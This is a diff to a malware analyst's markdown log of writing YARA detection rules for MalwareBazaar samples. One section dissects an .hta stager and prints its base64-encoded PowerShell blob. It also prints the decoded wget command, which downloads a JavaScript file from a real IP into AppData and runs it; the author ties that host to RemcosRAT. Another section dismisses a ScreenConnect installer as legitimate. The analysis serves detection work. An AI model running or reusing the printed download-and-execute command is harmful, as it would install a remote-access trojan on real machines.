@@ -166,7 +166,7 @@ And finished writing. Main component would be the killer script that is obfuscat
 [Final Rule](rules/Mirai.yar)
 
 
-## 5st rule
+## 5th rule
 
 [Malware Sample](https://bazaar.abuse.ch/sample/e55a67c005c7c70758cf680e8fbdabebeb0c9c0bc060d31082a57eafe05281ba)
 
@@ -382,3 +382,75 @@ It writes things 2 times in bat time somehow. It also make a query which i guess
 And finished this yara rule too. It was pretty hard, not worse than 5th rule, but it definitely was hard. 5th rule was hard because there was not much thing that I can work on. But this was hard because there was too many input to work on, almost none was worthy enough to use on the rule.
 
 [Final Rule](rules/QuasarRat.yar)
+
+## 9th rule
+
+[Malware Sample](https://bazaar.abuse.ch/sample/feddb7d55438986e3fdc46f5422865004cde6d01d23a85c616f4c1c401603dd5/)
+
+This sample is tagged with PhantomStealer tag and it is a single .hta file.
+Interestingly enough even though this particular kind of stealer have really many sample on malware bazaar there is no yara rule that is written to detect it. Because of this I plan to only invest 1 hour to analyze it. If I deem it not worthy enough I will switch to another sample instead.
+
+![basic commands](images/Screenshot_20261014_185940.png)
+
+.hta is an HTML Application file extension. But phantomstealer doesn't work this way according to this [reference site](https://darkatlas.io/blog/phantom-stealer-analysis-inside-the-two-layer-attack-chain-hidden-behind-a-windows-dll#how-does-phantom-stealer-work)
+
+I don't think it is directly PhantomStealer. It is just a stager/loader. It downloads a file from internet using this base64 encoded blob as argument to powershell.
+
+```
+IAAJAAkACQAJACAACQAgAAkACQAJAAkAIAAgACAAIAAJACAAIAAJAFcARwBlAHQAIAAJAB0gaAB0AHQAcAA6AC8ALwAxADcAMgAuADIANAA1AC4AMQA5ADUALgAyADAAOAAvADIANAAvAG4AaQBjAGUALgBqAHMAHSAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAE8AdQB0AEYASQBMAEUAIAAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAdICQAZQBuAFYAOgBhAHAAcABEAGEAVABBAFwAbgBpAGMAZQBuAG0AeQBnAGkAcgBsAHQAaABpAG4AawBpAG4AZwAuAGoAUwAdICAACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJADsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACYAIAAgACAAIAAgACAAIAAgACAAIAAgACAAHSAkAGUATgB2ADoAQQBwAHAARABBAHQAYQBcAG4AaQBjAGUAbgBtAHkAZwBpAHIAbAB0AGgAaQBuAGsAaQBuAGcALgBqAFMAHSA=
+```
+
+And when decoded it is this.
+
+![Decoded blob](images/Screenshot_20261014_191634.png)
+
+It uses wget to download a javascript file to AppData folder. and runs that javascript file.
+
+>  WGet 	”http://172.245.195.208/24/nice.js” -OutFILE ”$enV:appDaTA\nicenmygirlthinking.jS”; ”$eNv:AppDAta\nicenmygirlthinking.jS”
+
+I will look at the ip address in virustotal.
+
+![Bingo](images/Screenshot_20261014_192015.png)
+
+So this is related to remcosRAT which probably just installs the trojan to system and runs it. 
+
+Now, I'm gonna just write the yara for wget, powershell and encoding usage.
+
+And finished writing rule. I actually wrote separate rules for powershell usage with or without executionpolicy bypass, encodedcommand and base64 blob and for detecting ExpandEnvironmentStrings from vbscript and since I couldn't actually use nocase with base64 i dropped filtering for wget and actually put main logic for ip address and nice.js file. Since this was known ip for distributing RemCosRAT it is more reliable this way. 
+
+[Final Rule](rules/RemCosRATstager.yar)
+
+## 10th rule(Dismissed)
+
+[Malware Sample](https://bazaar.abuse.ch/sample/2f5b9d79715c6738a1384db2016270de7c1c503284abb4365a338d6a7aaf8b52)
+
+This file is tagged with
+ 
+> a ConnectWise dropped-by-gcleaner exe MIX4.file signed
+
+with this tags.
+
+Let me take strings and basic metadata out of it.
+
+![Basic Metadata](images/Screenshot_20261015_185705.png)
+
+So it starts with MZ and filesize is 5.5MB. 
+In this exe there is 5 resource which are embed executable files. 
+
+I dumped them using pestudion now I will take important datas screenshot.
+
+1. First embed file is a dll file named ScreenConnect.Core.dll. It is apparently .NET assembled file. So I decompiled it in ILSpy.
+2. is ScreenConnect.Windows.dll, which is also a .NET assembled executable and can be decompiled. 
+3. ScreenConnect.WindowsInstaller.dll.
+4. ScreenConnect.ClientInstallerRunner.exe
+5. DotNetResolver.exe
+
+What is the relation I wonder. Since file is really big I will analyze main file that I downloaded from MalwareBazaar using IDA.
+
+I don't think this file is actually malicious as virustotal or malware bazaar suggests. It is RMM. It is normal for it to connect to some addresses. It is weird that it has 5 embed .NET related files. Yeap, it is true that this app is commonly used by attackers, but it is legitimate software. I checked it against software itself source code hash. And they are identical. 
+
+
+**DISMISSED**
+
+Cause:*Non-Malicious*
+
